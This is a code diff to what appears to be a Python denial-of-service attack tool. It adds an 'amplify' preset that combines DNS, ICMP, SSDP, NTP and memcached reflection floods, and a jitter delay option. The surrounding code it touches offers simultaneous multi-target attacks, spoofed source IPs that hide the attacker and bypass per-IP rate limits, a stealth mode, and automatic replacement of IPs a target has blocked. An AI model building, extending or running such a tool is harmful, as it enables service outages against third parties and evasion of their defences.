@@ -32,6 +32,7 @@ if _IS_WINDOWS:
 
 _SRC_IPS = [None]  # type: ignore  # active source IPs (list)
 _BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
+_JITTER = [0.0]  # Jitter delay in seconds, set by --jitter
 _SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
 _RECOVERY = [False]  # True = auto-replace blocked IPs
 _PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
@@ -2373,8 +2374,8 @@ examples:
     ap.add_argument("--auto", action="store_true",
         help="Auto-detect target protocol and select optimal modes")
     ap.add_argument("--combo", default=None,
-        choices=['web', 'full', 'tls', 'proto'],
-        help="Preset mode combo: web(raw+udp+syn), full(+rst), tls(httpsmp+h2+udp), proto(grpcmp+h2+udp)")
+        choices=['web', 'full', 'tls', 'proto', 'amplify'],
+        help="Preset mode combo: web(raw+udp+syn), full(+rst), tls(httpsmp+h2+udp), proto(grpcmp+h2+udp), amplify(dns+icmp+ssdp+ntp+memcached)")
     ap.add_argument("--url", required=True)
     ap.add_argument("--targets", default=None,
         help="Comma-separated multiple target URLs (attack all simultaneously). Overrides --url")
@@ -2402,6 +2403,8 @@ examples:
         help="Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed). Hides real IP, bypasses per-IP rate limit")
     ap.add_argument("--stealth", action="store_true",
         help="Stealth mode: only use spoofed IPs, never expose real IP")
+    ap.add_argument("--jitter", type=float, default=0.0, metavar="MS",
+        help="Random delay between requests in ms (0 = max speed, 5 = ~5ms jitter)")
     ap.add_argument("--recovery", action="store_true",
         help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
     ap.add_argument("--pool", default=None, metavar="FILE",
@@ -2419,6 +2422,7 @@ examples:
         'full': 'raw,udp,syn,rst',
         'tls': 'httpsmp,h2,udp',
         'proto': 'grpcmp,h2,udp',
+        'amplify': 'dns,icmp,ssdp,ntp,memcached',
     }
     if args.combo:
         args.mode = COMBOS[args.combo]
@@ -2460,6 +2464,7 @@ examples:
     
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
+    _JITTER[0] = args.jitter / 1000.0
     if args.stealth:
         _SPOOF_MODE[0] = True
     
